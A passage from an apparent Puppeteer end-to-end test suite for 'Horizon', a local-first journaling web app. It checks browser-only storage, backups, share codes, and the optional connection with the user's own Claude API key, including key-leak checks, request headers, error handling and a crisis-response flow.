    await click(page, '[data-act="care-back"]');
    assert.strictEqual(await page.$eval('#t-today', (e) => e.value), words, 'their words are still in the box');
    await click(page, '[data-act="submit-today"]'); await page.waitForSelector('.move.care', { timeout: 5000 });
    await click(page, '[data-act="care-place"]'); // "This is not about me"
    await page.waitForSelector('.placed li', { timeout: 5000 });
    assert.ok(await st(page, (S) => S.state.units.length >= 2 && S.state.moves[0].offline === true));
  });
  await check('website: two more entries with the built-in reader, kept in this browser across a reload', async () => {
    await entry(page, 'Sleep is not optional for clear thinking. My mother always said trust takes years to build.');
    await entry(page, 'Good teams argue in the open. Money is mostly a way of not having to ask permission.');
    await page.evaluate('window.__hz.store.flushNow()'); await sleep(400);
    const before = await st(page, (S) => JSON.stringify(S.state));
    await page.reload({ waitUntil: 'load' });
    await page.waitForFunction('window.__hz && window.__hz.S.ready', { timeout: 20000 });
    assert.strictEqual(await st(page, (S) => JSON.stringify(S.state)), before);
    assert.strictEqual(await st(page, (S) => S.state.entries.length), 3);
  });
  await check('website: after a few entries it suggests saving a copy; saving one settles it', async () => {
    assert.ok((await text(page, '.panel')).includes('Your map lives only in this browser'));
    await click(page, '[data-act="backup-later"]');
    assert.ok(!(await text(page, '.panel')).includes('Your map lives only in this browser'), 'Later puts it away');
    await page.evaluate('localStorage.removeItem("horizon.backup.v1")');
    await goMore(page, 'data');
    assert.ok((await text(page, '.panel')).includes('saved in this browser only'));
    await click(page, '[data-act="keep-ask"]'); // the answer is the browser's to give; either way the app says which
    await page.waitForFunction('/will keep your map|said no for now/.test(document.querySelector("#toast").textContent)', { timeout: 3000 });
    assert.strictEqual(await page.evaluate('navigator.storage.persisted()'), await st(page, (S) => S.kept));
    await click(page, '[data-act="data-save"]');
    await page.waitForFunction('window.__downloads.length === 1', { timeout: 3000 });
    const d = await page.evaluate('window.__downloads[0]');
    assert.ok(/^horizon-\d{4}-\d{2}-\d{2}\.json$/.test(d.name) && d.href.startsWith('blob:'), JSON.stringify(d));
    await click(page, '[data-act="data-copy"]');
    const copy = JSON.parse(await page.evaluate('window.__clip'));
    assert.strictEqual(copy.app, 'horizon'); assert.strictEqual(copy.state.entries.length, 3);
    assert.ok(JSON.parse(await ls(page, 'horizon.backup.v1')).savedAt > 0);
    await click(page, '#tabs [data-view="today"]');
    assert.ok(!(await text(page, '.panel')).includes('Your map lives only in this browser'));
  });
  await check('website: reading aloud uses a voice on the device', async () => {
    await entry(page, 'Patience is a kind of confidence. I never feel more like myself than when I am building something.');
    await click(page, '[data-act="speak"]');
    await page.waitForFunction('window.__spoken.length >= 1 && !window.__hz.S.speaking', { timeout: 6000 });
    const said = await page.evaluate('window.__spoken');
    assert.ok(said.every((x) => x.voice === 'On this device'), JSON.stringify(said.map((x) => x.voice)));
    await click(page, '[data-act="done"]');
  });
  await check('website: share your regions as a code you send yourself', async () => {
    await goMore(page, 'together');
    assert.ok(!(await page.$('[data-act="share-save"]')), 'no page database to share through here');
    await click(page, 'input[name="share-region"][value="work"]'); await click(page, 'input[name="share-region"][value="people"]'); await click(page, 'input[name="share-region"][value="self"]'); await click(page, 'input[name="share-region"][value="money"]');
    await type(page, '#share-name', 'Noor');
    await click(page, '[data-act="code-make"]'); await yes(page);
    await page.waitForSelector('#t-mycode', { timeout: 3000 });
    shareCode = await page.$eval('#t-mycode', (e) => e.value);
    assert.ok(/^hz1\.[A-Za-z0-9_-]+$/.test(shareCode));
    await click(page, '[data-act="code-copy"]');
    assert.strictEqual(await page.evaluate('window.__clip'), shareCode);
    assert.strictEqual(await ls(page, 'horizon.name.v1'), '"Noor"');
    await shot(page, '22-site-share-code-phone');
  });
  await check('website: About says where words go; the rules match', async () => {
    await click(page, '[data-act="more-back"]'); await click(page, '[data-act="more"][data-sub="about"]');
    const t = await text(page, '.panel');
    ['no Horizon server', 'Off until you connect your own key', 'GitHub Pages', 'no trackers', 'not therapy', 'findahelpline.com', 'not made or endorsed by Anthropic'].forEach((x) => assert.ok(t.includes(x), x));
    await shot(page, '27-site-about-phone');
    const links = await page.$$eval('.panel a', (as) => as.map((a) => [a.href, a.target, a.rel]));
    assert.ok(links.length >= 3 && links.every((l) => l[0].startsWith('https://') && l[1] === '_blank' && l[2].includes('noopener') && l[2].includes('noreferrer')), JSON.stringify(links));
    await click(page, '[data-act="more-back"]'); await click(page, '[data-act="more"][data-sub="rules"]');
    assert.ok((await text(page, '.panel')).includes('make a share code'));
  });
  await check('website, no key: nothing was sent anywhere, and no errors', async () => {
    assert.deepStrictEqual(page.foreign, []);
    assert.strictEqual(fake ? fake.api.calls.length : 0, 0, 'no call to the API without a key');
    assert.deepStrictEqual(page.errors, []);
  });
  await page.ctx.close();

  /* ---- 8. with your own key, against the stand-in for the Claude API ---- */
  if (!fake) { skipped += 14; console.log('SKIP  part 8 (14 checks): the Claude API stand-in is not running'); }
  else {
    const api = fake.api, last = () => api.calls[api.calls.length - 1];
    const fails = async (pg, words) => { await click(pg, '#tabs [data-view="today"]'); await type(pg, '#t-today', words); await click(pg, '[data-act="submit-today"]'); await pg.waitForSelector('.banner.err', { timeout: 8000 }); return text(pg, '.panel'); };
    page = await open(browser, port, { mock: false });
    await check('key: a wrong key is refused and nothing is kept', async () => {
      await goMore(page, 'claude');
      const t = await text(page, '.panel');
      assert.ok(t.includes('your own Claude API key') && t.includes('api.anthropic.com') && t.includes('Do not connect on a computer you share'));
      await shot(page, '26-site-claude-phone');
      await type(page, '#k-key', 'too-short');
      await click(page, '.field [data-act="claude-connect"]');
      await page.waitForFunction('document.querySelector("#k-status").textContent.includes("does not look like")', { timeout: 3000 });
      assert.strictEqual(api.calls.length, 0, 'a malformed key is never sent');
      await type(page, '#k-key', 'sk-ant-api03-WRONG-this-key-does-not-exist-000000000000000');
      await click(page, '.field [data-act="claude-connect"]');
      await page.waitForFunction('document.querySelector("#k-status").textContent.includes("did not accept the key")', { timeout: 6000 });
      assert.strictEqual(await ls(page, 'horizon.claude.v1'), null);
      assert.strictEqual(await st(page, (S) => S.caps.sample), null);
      assert.ok((await page.$eval('#k-key', (e) => e.value)).startsWith('sk-ant-api03-WRONG'), 'still in the box, to correct');
      assert.strictEqual(await page.$eval('#k-key', (e) => e.type), 'password');
    });
    await check('key: the right key connects, is stored in this browser only, and is never shown again', async () => {
      await type(page, '#k-key', '  ' + KEY.slice(0, 20) + ' ' + KEY.slice(20) + ' '); // pasted with stray spaces
      await page.keyboard.press('Enter');
      await page.waitForFunction('document.querySelector(".panel").innerText.includes("Connected, with the key ending in")', { timeout: 8000 });
      assert.deepStrictEqual(JSON.parse(await ls(page, 'horizon.claude.v1')), { key: KEY, workspace: '', main: 'claude-sonnet-5-5', quick: 'claude-haiku-5-5' });
      assert.ok((await text(page, '.panel')).includes('key ending in ' + KEY.slice(-4)));
      assert.ok(!(await page.$('#k-key')), 'the box is gone');
      const leak = await page.evaluate((k) => ({ dom: document.documentElement.outerHTML.includes(k), state: JSON.stringify(window.__hz.S, (n, v) => (n === 'state' ? undefined : v)).includes(k), map: JSON.stringify(window.__hz.S.state).includes(k) }), KEY);
      assert.deepStrictEqual(leak, { dom: false, state: false, map: false });
      assert.ok(await st(page, (S) => !!S.caps.sample));
      await shot(page, '23-site-connected-phone');
    });
    await check('key: the call is what the API documents for a browser, and carries nothing else', async () => {
      const c = last(), h = c.headers;
      assert.ok(api.preflights >= 1, 'the browser asked permission first, and got it');
      assert.strictEqual(c.method + ' ' + c.url, 'POST /v1/messages');
      assert.strictEqual(h.authorization, 'Bearer ' + KEY);
      assert.strictEqual(h['anthropic-version'], '2026-10-21');
      assert.strictEqual(h['anthropic-dangerous-direct-browser-access'], 'true');
      assert.strictEqual(h['content-type'], 'application/json');
      assert.ok(!('cookie' in h) && !('referer' in h) && !('x-api-key' in h) && !('anthropic-workspace-id' in h), Object.keys(h).join(','));
      assert.deepStrictEqual(Object.keys(c.body).sort(), ['max_tokens', 'messages', 'model', 'output_config']);
      assert.deepStrictEqual([c.body.model, c.body.output_config, c.body.messages.length, c.body.messages[0].role], ['claude-sonnet-5-5', { effort: 'low' }, 1, 'user']);
    });
    await check('key: an entry is read by Claude through the API and placed', async () => {
      const words = 'I think most plans fail quietly. My father always said finish what you start. Why do I trust momentum more than strategy?';
      await click(page, '#tabs [data-view="today"]');
      assert.ok(!(await text(page, '.panel')).includes('Claude is not connected'));
      await type(page, '#t-today', words); await click(page, '[data-act="submit-today"]');
      await page.waitForSelector('.move', { timeout: 8000 });
      const s = await st(page, (S) => ({ units: S.state.units.map((u) => u.status), move: S.state.moves[0] }));
      assert.deepStrictEqual(s.units, ['yours', 'yours', 'yours', 'outline'], 'quotes are yours; the reworded one is an outline');
      assert.strictEqual(s.move.offline, false); assert.strictEqual(s.move.kind, 'bet');
      assert.ok(!(await text(page, '.move')).includes('built-in reader'));
      const b = last().body;
      assert.deepStrictEqual([b.model, b.max_tokens, b.output_config.effort, typeof b.system], ['claude-sonnet-5-5', 16000, 'medium', 'string']);
      assert.ok(b.messages[0].content.includes(words) && b.messages[0].content.includes('JOB 1.'));
      assert.ok(!('temperature' in b) && !('thinking' in b));
      await shot(page, '24-site-move-phone');
    });
    await check('key: still connected after a reload; quick questions use the quick model', async () => {
      await page.evaluate('window.__hz.store.flushNow()'); await sleep(300);
      await page.reload({ waitUntil: 'load' });
      await page.waitForFunction('window.__hz && window.__hz.S.ready && window.__hz.S.caps.sample', { timeout: 20000 });
      await goMore(page, 'expedition');
      await click(page, '[data-act="exp-start"]');
      await page.waitForSelector('#t-exp', { timeout: 6000 });
      assert.deepStrictEqual([last().body.model, last().body.output_config.effort, last().body.max_tokens], ['claude-haiku-5-5', 'low', 6000]);
      assert.ok((await text(page, '#p-exp')).includes('first thing that comes to mind'), 'the questions came from Claude');
      await click(page, '[data-act="exp-cancel"]');
    });
    await check('key: each kind of failure says what happened, keeps the words, and can be retried', async () => {
      api.mode = 'rate';
      let t = await fails(page, 'Deadlines are the only honest planning tool.');
      assert.ok(t.includes('limiting how fast this key can be used') && t.includes('Deadlines are the only honest'));
      assert.ok(!(await page.$('.btns [data-sub="claude"]')), 'not a problem with the key, so no detour to settings');
      api.mode = 'overloaded'; await click(page, '[data-act="retry"]'); await page.waitForFunction('document.querySelector(".banner.err") && document.querySelector(".banner.err").innerText.includes("overloaded")', { timeout: 8000 });
      api.mode = 'server'; await click(page, '[data-act="retry"]'); await page.waitForFunction('document.querySelector(".banner.err") && document.querySelector(".banner.err").innerText.includes("dropped")', { timeout: 8000 });
      api.mode = 'refusal'; await click(page, '[data-act="retry"]'); await page.waitForFunction('document.querySelector(".banner.err") && document.querySelector(".banner.err").innerText.includes("declined")', { timeout: 8000 });
      api.mode = 'cut'; await click(page, '[data-act="retry"]'); await page.waitForFunction('document.querySelector(".banner.err") && document.querySelector(".banner.err").innerText.includes("cut off")', { timeout: 8000 });
      api.mode = 'billing'; await click(page, '[data-act="retry"]'); await page.waitForFunction('document.querySelector(".banner.err") && document.querySelector(".banner.err").innerText.includes("needs credit")', { timeout: 8000 });
      t = await text(page, '.panel');
      assert.ok(t.includes('Anthropic said: Your credit balance is too low'), 'the API\'s own sentence is shown');
      assert.ok(await page.$('.btns [data-sub="claude"]'), 'account trouble offers the way to the settings');
      assert.strictEqual(await st(page, (S) => S.state.entries.length), 1, 'nothing was placed by any failed try');
      api.mode = 'fenced'; await click(page, '[data-act="retry"]'); // a reply wrapped in a code fence still reads
      await page.waitForSelector('.move', { timeout: 8000 });
      assert.strictEqual(await st(page, (S) => S.state.entries.length), 2);
      api.mode = 'ok';
    });
    await check('key: a model that does not take the effort setting is asked again without it', async () => {
      api.noEffort = true; const n = api.calls.length;
      await entry(page, 'The winners write the advice, and nobody hears from the ones who quit.');
      assert.strictEqual(api.calls.length, n + 2, 'one refusal, one repeat');
      assert.ok(api.calls[n].body.output_config && !api.calls[n + 1].body.output_config);
      await entry(page, 'Music is the only thing that makes me stop planning.');
      assert.strictEqual(api.calls.length, n + 3); assert.ok(!last().body.output_config, 'and it is remembered for that model');
      api.noEffort = false;
    });
    await check('key: stop cancels the call and gives the words back', async () => {
      api.delay = 2500;
      await click(page, '#tabs [data-view="today"]');
      await type(page, '#t-today', 'This one I will cancel before it lands.');
      await click(page, '[data-act="submit-today"]');
      await page.waitForSelector('[data-act="stop"]', { timeout: 3000 }); await sleep(200);
      await click(page, '[data-act="stop"]');
      await page.waitForSelector('#t-today', { timeout: 3000 });
      assert.strictEqual(await page.$eval('#t-today', (e) => e.value), 'This one I will cancel before it lands.');
      api.delay = 30; await sleep(300);
      await type(page, '#t-today', '');
    });
    await check('key: a crisis is answered by Claude, not mapped; "not about me" asks Claude once more', async () => {
      const n = await st(page, (S) => S.state.entries.length), words = 'I have been thinking about suicide. It is the subject of the novel I am writing.';
      await type(page, '#t-today', words); await click(page, '[data-act="submit-today"]');
      await page.waitForSelector('.move.care', { timeout: 8000 });
      assert.ok((await text(page, '.move.care')).includes('I am taking what you wrote seriously'), 'Claude\'s own words');
      assert.strictEqual(await st(page, (S) => S.state.entries.length), n);
      await click(page, '[data-act="care-place"]');
      await page.waitForSelector('.placed li', { timeout: 8000 });
      assert.ok(last().body.messages[0].content.includes('says this entry is not about them being at risk'));
      assert.deepStrictEqual(await st(page, (S) => [S.state.entries.length, S.state.moves[S.state.moves.length - 1].offline]), [n + 1, false]);
    });
    await check('key: Advanced settings are kept only if Claude answers with them', async () => {
      await goMore(page, 'claude');
      await click(page, '.adv summary');
      await type(page, '#k-main', 'claude-nope-9');
      await click(page, '.adv [data-act="claude-connect"]');
      await page.waitForFunction('document.querySelector("#k-status").textContent.includes("did not recognise a model name")', { timeout: 6000 });
      assert.strictEqual(JSON.parse(await ls(page, 'horizon.claude.v1')).main, 'claude-sonnet-5-5', 'the working settings are untouched');
      await type(page, '#k-main', 'claude-opus-5-5');
      await click(page, '.adv [data-act="claude-connect"]');
      await page.waitForFunction('document.querySelector(".panel").innerText.includes("Readings use claude-opus-5-5")', { timeout: 6000 });
      assert.strictEqual(JSON.parse(await ls(page, 'horizon.claude.v1')).main, 'claude-opus-5-5');
      // a key that is not tied to one workspace
      api.needWorkspace = true;
      await click(page, '.btns [data-act="claude-connect"]');
      await page.waitForFunction('document.querySelector("#k-status").textContent.includes("not tied to one workspace")', { timeout: 6000 });
      await click(page, '.adv summary'); await type(page, '#k-ws', fakeApi.WORKSPACE);
      await click(page, '.adv [data-act="claude-connect"]');
      await page.waitForFunction((w) => { const c = JSON.parse(localStorage.getItem('horizon.claude.v1') || '{}'); return c.workspace === w; }, { timeout: 6000 }, fakeApi.WORKSPACE);
      assert.strictEqual(last().headers['anthropic-workspace-id'], fakeApi.WORKSPACE);
      await entry(page, 'Trust is built in drops and lost in buckets.');
      assert.deepStrictEqual([last().body.model, last().headers['anthropic-workspace-id']], ['claude-opus-5-5', fakeApi.WORKSPACE]);
      await click(page, '[data-act="done"]');
    });
    await check('key: compare with someone\'s share code, read by Claude', async () => {
      await goMore(page, 'together');
      await type(page, '#t-code', 'not a code'); await click(page, '[data-act="code-add"]');
      assert.strictEqual(await page.$$eval('[data-act="friend-remove"]', (b) => b.length), 0, 'junk is refused');
      await page.$eval('#t-code', (e, v) => { e.value = v; e.dispatchEvent(new Event('input', { bubbles: true })); }, shareCode.slice(0, 50) + '\n' + shareCode.slice(50));
      await click(page, '[data-act="code-add"]');
      await page.waitForSelector('[data-act="friend-remove"]', { timeout: 3000 });
      assert.ok((await text(page, '.rows')).includes('Noor'));
      const pid = await page.$eval('[data-act="friend-remove"]', (b) => b.dataset.id);
      await click(page, '[data-act="tog-run"][data-id="' + pid + '"]');
      await page.waitForSelector('.cards .card', { timeout: 8000 });
      assert.strictEqual(await page.$$eval('.cards .card', (c) => c.length), 3);
      assert.ok((await text(page, '.panel')).includes('You and Noor') && !(await text(page, '.panel')).includes('built-in reader'));
      assert.ok(last().body.messages[0].content.includes('PERSON B'));
      await click(page, '[data-act="tog-clear"]');
      await page.reload({ waitUntil: 'load' }); await page.waitForFunction('window.__hz && window.__hz.S.ready', { timeout: 20000 });
      await goMore(page, 'together');
      assert.ok((await text(page, '.rows')).includes('Noor'), 'their map is still here after a reload');
      await click(page, '[data-act="friend-remove"]'); await yes(page);
      await page.waitForFunction('!document.querySelector("[data-act=friend-remove]")', { timeout: 3000 });
      assert.strictEqual(await ls(page, 'horizon.friends.v1'), '[]');
      await page.$eval('#t-code', (e, v) => { e.value = v; e.dispatchEvent(new Event('input', { bubbles: true })); }, shareCode);
      await click(page, '[data-act="code-add"]'); await page.waitForSelector('[data-act="friend-remove"]', { timeout: 3000 }); // back again, for the last check
    });
    await check('key: if the key stops working, the entry is kept and the way to fix it is offered', async () => {
      api.key = 'sk-ant-api03-ROTATED-the-old-key-was-revoked-00000000000000';
      const t = await fails(page, 'Habits are votes for the person you are becoming.');
      assert.ok(t.includes('did not accept the key') && t.includes('Habits are votes'));
      await click(page, '.btns [data-sub="claude"]');
      assert.ok((await text(page, '.panel')).includes('The last reading failed'));
      api.key = KEY;
      await click(page, '.btns [data-act="claude-connect"]');
      await page.waitForFunction('!document.querySelector(".panel").innerText.includes("The last reading failed")', { timeout: 6000 });
      api.mode = 'org_blocked';
      await click(page, '.btns [data-act="claude-connect"]');
      await page.waitForFunction('document.querySelector("#k-status").textContent.includes("organization does not let its keys be used from a web page")', { timeout: 6000 });
      api.mode = 'ok';
      await click(page, '#tabs [data-view="today"]');
      await click(page, '[data-act="retry"]'); await page.waitForSelector('.move', { timeout: 8000 });
    });
    await check('key: forgetting it removes it from this browser, and the built-in reader takes over', async () => {
      await goMore(page, 'claude');
      await click(page, '[data-act="claude-forget"]');
      await page.waitForSelector('#dialog [data-v="0"]', { visible: true }); await click(page, '#dialog [data-v="0"]');
      assert.ok(await ls(page, 'horizon.claude.v1'), 'cancel keeps it');
      await click(page, '[data-act="claude-forget"]'); await yes(page);
      assert.strictEqual(await ls(page, 'horizon.claude.v1'), null);
      assert.ok(await page.$('#k-key'), 'back to the empty box');
      const n = api.calls.length;
      await entry(page, 'Sleep is not optional for clear thinking.');
      assert.strictEqual(api.calls.length, n, 'no call without a key');
      assert.strictEqual(await st(page, (S) => S.state.moves[S.state.moves.length - 1].offline), true);
      assert.ok(!(await page.evaluate((k) => JSON.stringify(localStorage).includes(k), KEY)), 'the key is nowhere in this browser\'s storage');
    });
    await check('key: delete everything also removes the maps other people shared, and says so', async () => {
      await goMore(page, 'data');
      await click(page, '[data-act="data-reset"]');
      await page.waitForSelector('#dialog [data-v="1"]', { visible: true });
      assert.ok((await text(page, '#dialog')).includes('map someone shared with you'));
      await click(page, '#dialog [data-v="1"]');
      await page.waitForFunction('window.__hz.S.state.units.length === 0', { timeout: 3000 });
      assert.strictEqual(await ls(page, 'horizon.friends.v1'), null);
      assert.deepStrictEqual(page.foreign, [], 'the only other server the page ever spoke to was the API');
      assert.deepStrictEqual(page.errors, []);
    });
    await page.ctx.close();
  }

  /* ---- 9. the website on a wide screen ---- */
  page = await open(browser, port, { mock: false, w: 1360, h: 860 });
  await check('website, desktop: the key panel and the map side by side', async () => {
    await entry(page, 'Cities are machines for meeting strangers. Travel should change what you think is normal.');
    await goMore(page, 'claude');
    await sleep(900);
    await shot(page, '25-site-claude-desktop');
    assert.ok((await text(page, '.panel')).includes('What happens to the key'));
  });
  await check('website: "Save a copy as a file" really writes a file the app can read back', async () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'hz-dl-'));
    try {
      const cdp = await page.createCDPSession();
      await cdp.send('Browser.setDownloadBehavior', { behavior: 'allow', downloadPath: dir, browserContextId: page.ctx.id });
      await page.evaluate('window.__realDownloads = true');
      await goMore(page, 'data');
      await click(page, '[data-act="data-save"]');
      let files = [];
      for (let i = 0; i < 40 && !files.length; i++) { await sleep(150); files = fs.readdirSync(dir).filter((f) => /^horizon-.*\.json$/.test(f)); }
      assert.strictEqual(files.length, 1, 'downloaded: ' + fs.readdirSync(dir).join(','));
      const saved = fs.readFileSync(path.join(dir, files[0]), 'utf8');
      const HZ = require('../js/core.js'), back = HZ.importState(saved);
      assert.ok(back && back.entries.length === 1 && back.units.length >= 2);
      assert.strictEqual(JSON.stringify(back.units.map((u) => u.text)), await st(page, (S) => JSON.stringify(S.state.units.map((u) => u.text))));
    } finally { fs.rmSync(dir, { recursive: true, force: true }); }
    assert.deepStrictEqual(page.errors, []); assert.deepStrictEqual(page.foreign, []);
  });
  await page.ctx.close();

  console.log('\n' + passed + ' passed, ' + failures + ' failed' + (skipped ? ', ' + skipped + ' skipped' : ''));
  await browser.close(); srv.close(); if (fake) fake.close();
  process.exit(failures ? 1 : 0);
})().catch((e) => { console.error(e); process.exit(1); });
